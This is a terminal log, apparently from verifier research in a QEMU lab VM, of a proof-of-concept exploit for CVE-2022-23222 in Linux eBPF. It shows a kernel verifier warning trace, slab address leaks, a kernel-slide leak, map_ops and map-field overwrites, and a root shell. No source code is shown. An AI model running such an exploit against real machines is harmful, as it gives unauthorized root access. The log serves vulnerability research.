test@syzkaller:/root/DRACO-verifier/examples/CVE-2022-23222-POC$ sudo ./exploit
[sudo] password for test: 
Return from syscall : 3
[+] eBPF enabled, ringbuf created!
[!] staring to create new maps until we get two consecutive maps
[+] created map 1
[+] generated random value: b3eb1a768ee5016e
[+] created map 2
[+] generated random value: 30ab0e63261f57be
[+] two new maps created!
[   64.395359] ------------[ cut here ]------------
[   64.395712] WARNING: CPU: 1 PID: 320 at kernel/bpf/verifier.c:8502 mark_ptr_or_null_reg.constprop.0+0x3c/0xb0
[   64.396439] Modules linked in:
[   64.396671] CPU: 1 PID: 320 Comm: exploit Not tainted 5.13.0-27-generic #29~20.04.1-Ubuntu
[   64.397352] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   64.398085] RIP: 0010:mark_ptr_or_null_reg.constprop.0+0x3c/0xb0
[   64.398607] Code: d4 53 48 89 fb 8b 3f e8 42 d7 ff ff 84 c0 74 08 8b 43 18 44 39 e8 74 07 5b 41 5c 41 5d 5d c3 85 c0 74 70 48 83 7b 30 00 74 28 <0f> 0b 31 f6 48 89 df e8 28 dd ff ff c7 43 04 00 00 00 00 45 84 e4
[   64.400192] RSP: 0018:ffffa5184058bab8 EFLAGS: 00010202
[   64.400646] RAX: 0000000000000407 RBX: ffff8def43fefb48 RCX: 0000000000000016
[   64.401267] RDX: 0000000000000000 RSI: 0000000000000002 RDI: 0000000000000016
[   64.401874] RBP: ffffa5184058bad0 R08: ffff8def43fef800 R09: 0000000000000000
[   64.402486] R10: ffff8def43e7b600 R11: 0000000000000000 R12: 0000000000000000
[   64.403033] R13: 0000000000000002 R14: 0000000000000002 R15: ffff8def43fefbc0
[   64.403558] FS:  00007f3ad9094b80(0000) GS:ffff8defbdd00000(0000) knlGS:0000000000000000
[   64.404155] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   64.404579] CR2: 00007ffe73365000 CR3: 0000000005812006 CR4: 0000000000770ee0
[   64.405107] PKRU: 55555554
[   64.405312] Call Trace:
[   64.405500]  mark_ptr_or_null_regs+0x81/0x140
[   64.405834]  check_cond_jmp_op+0x35f/0x9b0
[   64.406140]  ? bpf_verifier_log_write+0x70/0xb0
[   64.406478]  do_check+0xce7/0x1820
[   64.406742]  ? bpf_verifier_log_write+0xb0/0xb0
[   64.407078]  ? mark_ptr_not_null_reg.isra.0+0xd0/0xd0
[   64.407454]  do_check_common+0x249/0x2f0
[   64.407748]  bpf_check+0x1475/0x1510
[   64.408015]  ? kvm_clock_get_cycles+0x11/0x20
[   64.408340]  bpf_prog_load+0x466/0xa00
[   64.408621]  ? queued_spin_unlock+0x9/0x10
[   64.408930]  ? do_anonymous_page+0x233/0x3b0
[   64.409248]  ? security_capable+0x3a/0x60
[   64.409548]  __do_sys_bpf+0xa5e/0x1b30
[   64.409832]  __x64_sys_bpf+0x1a/0x20
[   64.410099]  do_syscall_64+0x61/0xb0
[   64.410368]  ? exc_page_fault+0x8f/0x170
[   64.410669]  ? asm_exc_page_fault+0x8/0x30
[   64.410976]  entry_SYSCALL_64_after_hwframe+0x44/0xae
[   64.411352] RIP: 0033:0x7f3ad91c2fc9
[   64.411620] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 97 8e 0d 00 f7 d8 64 89 01 48
[   64.412970] RSP: 002b:00007ffe73167a28 EFLAGS: 00000206 ORIG_RAX: 0000000000000141
[   64.413490] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f3ad91c2fc9
[   64.414007] RDX: 0000000000000078 RSI: 00007ffe73167a70 RDI: 0000000000000005
[   64.414503] RBP: 00007ffe73167a40 R08: 0000000000001000 R09: 00007ffe73167a70
[   64.415011] R10: 0000000000000000 R11: 0000000000000206 R12: 000056022660d190
[   64.415517] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[   64.416018] ---[ end trace 5118d4193147ddfa ]---
[+] value read from slab: 0
[+] value read from slab: 0
[+] created map 3
[+] generated random value: f33c3d6b97937e01
[+] created map 4
[+] generated random value: c93f792805f608db
[+] eBPF enabled, maps created!
[+] value read from slab: 0
[+] value read from slab: ffff8def458e2910
[+] created map 5
[+] generated random value: f0ad139726e884b
[+] created map 6
[+] generated random value: 3cf716df5d142979
[+] eBPF enabled, maps created!
[+] value read from slab: ffff8def458e1908
[+] value read from slab: f0ad139726e884b
[+] aligned map found in map 4
1: 3cf716df5d142979
2: f0ad139726e884b
[+] closing unnecessary_maps 
[+] found map address: 0xffff8def458e1400
[+] overriding map_ops
[+] detected kernel slide 26200000
[+] setting spin_lock = 0
[+] setting max_entries = 0xffffffff
[+] setting map_type = BPF_MAP_TYPE_STACK
[+] getting root
[+] iterating over task_struct list to find out process
[+] got it!
[+] cleaning up
[+] getting shell!
# ls
Makefile   bpf.h        exploit.bc  exploit.ll  klee-out-1  klee-out-4
README.md  buildnew.sh  exploit.c   klee-last   klee-out-2
bpf.c      exploit      exploit.h   klee-out-0  klee-out-3
# whoami
root
# ^C
# exit
